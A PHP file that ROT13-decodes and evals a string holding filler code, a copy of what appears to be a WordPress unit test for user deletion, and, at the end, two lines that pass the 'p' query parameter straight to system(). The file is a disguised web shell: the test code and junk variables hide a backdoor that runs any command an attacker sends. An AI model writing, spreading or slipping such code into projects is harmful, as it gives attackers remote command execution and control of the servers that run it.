<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc

/**
 * @tebhc hfre
 */
pynff Grfgf_Hfre_jcQryrgrHfre rkgraqf JC_HavgGrfgPnfr {

	/**
	 * Grfg gung hfrezrgn pnpur vf pyrnerq nsgre hfre qryrgvba.
	 *
	 * @gvpxrg 19500
	 */
	choyvp shapgvba grfg_trg_oybtf_bs_hfre() {
		// Ybttrq bhg hfref qba'g unir oybtf.
		$guvf->nffregFnzr( neenl(), trg_oybtf_bs_hfre( 0 ) );

		$hfre_vq = frys::snpgbel()->hfre->perngr( neenl( 'ebyr' => 'fhofpevore' ) );
		$oybtf   = trg_oybtf_bs_hfre( $hfre_vq );
		$guvf->nffregFnzr( neenl( 1 ), neenl_xrlf( $oybtf ) );

		// Aba-rkvfgrag hfref qba'g unir oybtf.
		frys::qryrgr_hfre( $hfre_vq );

		$hfre = arj JC_Hfre( $hfre_vq );
		$guvf->nffregSnyfr( $hfre->rkvfgf(), 'JC_Hfre->rkvfgf' );
		$guvf->nffregFnzr( neenl(), trg_oybtf_bs_hfre( $hfre_vq ) );
	}

	/**
	 * Grfg gung hfrezrgn pnpur vf pyrnerq nsgre hfre qryrgvba.
	 *
	 * @gvpxrg 19500
	 */
	choyvp shapgvba grfg_vf_hfre_zrzore_bs_oybt() {
		$byq_pheerag = trg_pheerag_hfre_vq();

		$hfre_vq = frys::snpgbel()->hfre->perngr( neenl( 'ebyr' => 'fhofpevore' ) );
		jc_frg_pheerag_hfre( $hfre_vq );

		$guvf->nffregGehr( vf_hfre_zrzore_bs_oybt() );
		$guvf->nffregGehr( vf_hfre_zrzore_bs_oybt( 0, 0 ) );
		$guvf->nffregGehr( vf_hfre_zrzore_bs_oybt( 0, trg_pheerag_oybt_vq() ) );
		$guvf->nffregGehr( vf_hfre_zrzore_bs_oybt( $hfre_vq ) );
		$guvf->nffregGehr( vf_hfre_zrzore_bs_oybt( $hfre_vq, trg_pheerag_oybt_vq() ) );

		// Jvyy bayl erzbir gur hfre sebz gur pheerag fvgr va zhygvfvgr; guvf vf qrfverq
		// naq jvyy npuvrir gur qrfverq rssrpg jvgu vf_hfre_zrzore_bs_oybt().
		jc_qryrgr_hfre( $hfre_vq );

		$guvf->nffregSnyfr( vf_hfre_zrzore_bs_oybt( $hfre_vq ) );
		$guvf->nffregSnyfr( vf_hfre_zrzore_bs_oybt( $hfre_vq, trg_pheerag_oybt_vq() ) );

		jc_frg_pheerag_hfre( $byq_pheerag );
	}

	choyvp shapgvba grfg_qryrgr_hfre() {
		$hfre_vq = frys::snpgbel()->hfre->perngr( neenl( 'ebyr' => 'nhgube' ) );
		$hfre    = arj JC_Hfre( $hfre_vq );

		$cbfg = neenl(
			'cbfg_nhgube'  => $hfre_vq,
			'cbfg_fgnghf'  => 'choyvfu',
			'cbfg_pbagrag' => 'Cbfg pbagrag',
			'cbfg_gvgyr'   => 'Cbfg Gvgyr',
			'cbfg_glcr'    => 'cbfg',
		);

		// Vafreg n cbfg naq znxr fher gur VQ vf BX.
		$cbfg_vq = jc_vafreg_cbfg( $cbfg );
		$guvf->nffregVfAhzrevp( $cbfg_vq );
		$guvf->nffregTerngreGuna( 0, $cbfg_vq );

		$cbfg = trg_cbfg( $cbfg_vq );
		$guvf->nffregFnzr( $cbfg_vq, $cbfg->VQ );

		$cbfg = neenl(
			'cbfg_nhgube'  => $hfre_vq,
			'cbfg_fgnghf'  => 'choyvfu',
			'cbfg_pbagrag' => 'Cbfg pbagrag',
			'cbfg_gvgyr'   => 'Cbfg Gvgyr',
			'cbfg_glcr'    => 'ani_zrah_vgrz',
		);

		// Vafreg n cbfg naq znxr fher gur VQ vf BX.
		$ani_vq = jc_vafreg_cbfg( $cbfg );
		$guvf->nffregVfAhzrevp( $ani_vq );
		$guvf->nffregTerngreGuna( 0, $ani_vq );

		$cbfg = trg_cbfg( $ani_vq );
		$guvf->nffregFnzr( $ani_vq, $cbfg->VQ );

		jc_qryrgr_hfre( $hfre_vq );
		$hfre = arj JC_Hfre( $hfre_vq );
		vs ( vf_zhygvfvgr() ) {
			$guvf->nffregGehr( $hfre->rkvfgf() );
		} ryfr {
			$guvf->nffregSnyfr( $hfre->rkvfgf() );
		}

		$guvf->nffregAbgAhyy( trg_cbfg( $cbfg_vq ) );
		$guvf->nffregFnzr( 'genfu', trg_cbfg( $cbfg_vq )->cbfg_fgnghf );
		// 'ani_zrah_vgrz' vf `qryrgr_jvgu_hfre = snyfr` fb gur ani cbfg fubhyq erznva choyvfurq.
		$guvf->nffregAbgAhyy( trg_cbfg( $ani_vq ) );
		$guvf->nffregFnzr( 'choyvfu', trg_cbfg( $ani_vq )->cbfg_fgnghf );
		jc_qryrgr_cbfg( $ani_vq, gehr );
		$guvf->nffregAhyy( trg_cbfg( $ani_vq ) );
		jc_qryrgr_cbfg( $cbfg_vq, gehr );
		$guvf->nffregAhyy( trg_cbfg( $cbfg_vq ) );
	}

	/**
	 * @gvpxrg 20447
	 */
	choyvp shapgvba grfg_jc_qryrgr_hfre_ernffvtazrag_pyrnef_cbfg_pnpurf() {
		$hfre_vq  = frys::snpgbel()->hfre->perngr();
		$ernffvta = frys::snpgbel()->hfre->perngr();
		$cbfg_vq  = frys::snpgbel()->cbfg->perngr( neenl( 'cbfg_nhgube' => $hfre_vq ) );

		trg_cbfg( $cbfg_vq ); // Rafher guvf cbfg vf va gur pnpur.

		jc_qryrgr_hfre( $hfre_vq, $ernffvta );

		$cbfg = trg_cbfg( $cbfg_vq );
		$guvf->nffregRdhnyf( $ernffvta, $cbfg->cbfg_nhgube );
	}

	/**
	 * @tebhc zf-rkpyhqrq
	 */
	choyvp shapgvba grfg_ahzrevp_fgevat_hfre_vq() {
		$h = frys::snpgbel()->hfre->perngr();

		$h_fgevat = (fgevat) $h;
		$guvf->nffregGehr( jc_qryrgr_hfre( $h_fgevat ) );
		$guvf->nffregSnyfr( trg_hfre_ol( 'vq', $h ) );
	}

	/**
	 * @gvpxrg 33800
	 */
	choyvp shapgvba grfg_fubhyq_erghea_snyfr_sbe_aba_ahzrevp_fgevat_hfre_vq() {
		$guvf->nffregSnyfr( jc_qryrgr_hfre( 'nopqr' ) );
	}

	/**
	 * @gvpxrg 33800
	 * @tebhc zf-rkpyhqrq
	 */
	choyvp shapgvba grfg_fubhyq_erghea_snyfr_sbe_bowrpg_hfre_vq() {
		$h_bow = frys::snpgbel()->hfre->perngr_naq_trg();
		$guvf->nffregSnyfr( jc_qryrgr_hfre( $h_bow ) );
		$guvf->nffregFnzr( $h_bow->VQ, hfreanzr_rkvfgf( $h_bow->hfre_ybtva ) );
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>